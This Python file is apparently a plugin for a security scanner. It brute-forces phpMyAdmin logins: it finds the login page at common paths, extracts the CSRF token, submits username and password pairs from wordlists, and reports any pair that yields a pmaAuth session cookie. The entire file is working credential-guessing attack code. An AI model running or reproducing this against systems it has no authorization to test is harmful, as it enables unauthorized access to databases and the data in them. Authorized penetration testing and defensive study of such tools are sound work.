#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

import re
from urllib.parse import quote
from lib.core.env import *
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    def load_dict(self):
        username_txt_path = self.parameter.get("U", None)
        if username_txt_path:
            self.username_list = self.read_file(username_txt_path)
        else:
            self.username_list = self.get_default_dict("phpmyadmin_usernames.txt")

        password_txt_path = self.parameter.get("P", None)
        if password_txt_path:
            self.password_list = self.read_file(password_txt_path)
        else:
            self.password_list = self.get_default_dict("phpmyadmin_passwords.txt")

    async def prove(self):
        if self.base_url:
            # flag_list = ['src="navigation.php', 'frameborder="0" id="frame_content"', 'id="li_service_type">','class="disableAjax" title=']
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url, [
                    './phpMyAdmin/',
                    './pma/',
                    '/phpmyadmin/',
                    './',
                ]):
                    url = path + 'index.php'
                    async with session.get(url=url, headers=headers) as res1:
                        if res1:
                            text1 = await res1.text()
                            if 'input_password' in text1 and 'name="token"' in text1:
                                async for (username, password) in self.generate_auth_dict(self.username_list, self.password_list):
                                    try:
                                        async with session.get(url=url, headers=headers) as res2:
                                            if res2:
                                                text2 = await res2.text()
                                                cookies = res2.cookies
                                                token = re.search('name="token" value="(.*?)" />', text2)
                                                if token != None:
                                                    token_hash = quote(token.group(1))
                                                    postdata = "pma_username=%s&pma_password=%s&server=1&target=index.php&lang=zh_CN&collation_connection=utf8_general_ci&token=%s" % (
                                                        username, password, token_hash)
                                                    async with session.post(url=url, data=postdata, headers=headers, cookies=cookies, allow_redirects=False) as res3:
                                                        if res3 and res3.status == 302:
                                                            cookies = res3.cookies
                                                            for key,val in cookies.items():
                                                                if 'pmaAuth' in key and val != 'deleted':
                                                                    yield username + '/' + password
                                    except:
                                        pass